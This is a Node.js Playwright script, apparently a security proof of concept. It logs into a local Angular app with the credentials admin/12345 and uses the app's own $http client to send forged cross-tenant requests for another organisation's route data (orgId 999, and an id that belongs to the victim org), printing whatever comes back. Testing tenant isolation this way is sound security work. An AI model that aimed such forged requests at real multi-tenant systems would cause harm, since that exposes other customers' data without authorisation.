const { chromium } = require('playwright');
const LEGACY = 'http://localhost:8080';

async function login(page) {
  await page.goto(`${LEGACY}/index.html`, { waitUntil: 'load', timeout: 30000 });
  await page.waitForTimeout(1500);
  await page.fill('#userName', 'admin');
  await page.fill('#password', '12345');
  await page.locator('#password').blur();
  await page.waitForFunction(() => document.querySelectorAll('#organizationId option').length > 1, { timeout: 10000 });
  await page.selectOption('#organizationId', '1');
  await page.waitForFunction(() => document.querySelectorAll('#unitId option').length > 1, { timeout: 10000 });
  const unitVal = await page.$eval('#unitId option:nth-child(2)', (o) => o.value);
  await page.selectOption('#unitId', unitVal);
  await page.click('input[type="submit"]');
  await page.waitForTimeout(1500);
  const confirmOk = page.locator('button:has-text("Ok")').first();
  if (await confirmOk.isVisible().catch(() => false)) await confirmOk.click();
  await page.waitForFunction(() => !!window.sessionStorage.getItem('token'), { timeout: 15000 });
}

async function main() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();
  await login(page);

  // Land on the real, legitimate org1 routeAdministration screen first, so
  // Angular's own $http interceptors (real auth headers, whatever they are)
  // are exercised exactly as the real app uses them.
  await page.goto(`${LEGACY}/index.html#/routeAdministration`, { waitUntil: 'load', timeout: 20000 });
  await page.waitForTimeout(2000);

  // Use the app's OWN injected $http service (same interceptor chain, same
  // auth headers a real click would send) to fire the forged cross-org request
  // -- this is not a synthetic fetch, it's the live app's real HTTP client.
  const forgedList = await page.evaluate(async () => {
    const injector = angular.element(document.body).injector();
    const $http = injector.get('$http');
    try {
      const res = await $http.get('/api/global/route/of/administration/999');
      return { status: res.status, data: res.data };
    } catch (e) {
      return { status: e.status, data: e.data };
    }
  });
  console.error('Real app $http.get, forged orgId=999 (victim tenant), real org1 session:');
  console.error(JSON.stringify(forgedList, null, 1));

  const byIdVictim = await page.evaluate(async () => {
    const injector = angular.element(document.body).injector();
    const $http = injector.get('$http');
    try {
      const res = await $http.get('/api/global/route/of/administration/1/1');
      return { status: res.status, data: res.data };
    } catch (e) {
      return { status: e.status, data: e.data };
    }
  });
  console.error('Real app $http.get, org1 path but id=1 belongs to victim org 999:');
  console.error(JSON.stringify(byIdVictim, null, 1));

  await browser.close();
}
main().catch((e) => { console.error('FATAL', e); process.exit(1); });
